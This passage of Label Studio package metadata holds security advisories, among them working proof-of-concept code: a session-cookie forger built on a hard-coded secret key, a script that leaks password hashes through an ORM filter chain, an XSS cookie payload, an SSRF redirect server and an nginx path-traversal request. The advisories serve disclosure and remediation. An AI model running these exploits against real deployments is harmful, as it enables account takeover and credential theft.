django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.1.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.1.1/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.12)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","label-studio-converter (==0.0.30)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.1.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"7bb2b446aba709671997ac499e7696f8433f39a1bbd2ba75e7f860a498746135","md5":"5d70135ada17d4b5c58e32a30ed47cc6","sha256":"a6a039aaab51eca052eb8ecd7190cbb10e32718c5149e794bf1d4143106f88e8"},"downloads":-1,"filename":"label_studio-1.1.1-py3-none-any.whl","has_sig":false,"md5_digest":"5d70135ada17d4b5c58e32a30ed47cc6","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":47647908,"upload_time":"2021-08-13T09:18:16","upload_time_iso_8601":"2021-08-13T09:18:16.786146Z","url":"https://files.pythonhosted.org/packages/7b/b2/b446aba709671997ac499e7696f8433f39a1bbd2ba75e7f860a498746135/label_studio-1.1.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"f80291bc5dee37a913ac97fd031869658a0735430233c55b6b2ee57f28abe3d7","md5":"77af1cf8d396dc0598f6ae942a50fad9","sha256":"82f0f5f3c38f5667cb5a557443272306f0cfba2f93c38059dee30286f3ffdbf2"},"downloads":-1,"filename":"label-studio-1.1.1.tar.gz","has_sig":false,"md5_digest":"77af1cf8d396dc0598f6ae942a50fad9","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":46832000,"upload_time":"2021-08-13T09:20:56","upload_time_iso_8601":"2021-08-13T09:20:56.128059Z","url":"https://files.pythonhosted.org/packages/f8/02/91bc5dee37a913ac97fd031869658a0735430233c55b6b2ee57f28abe3d7/label-studio-1.1.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    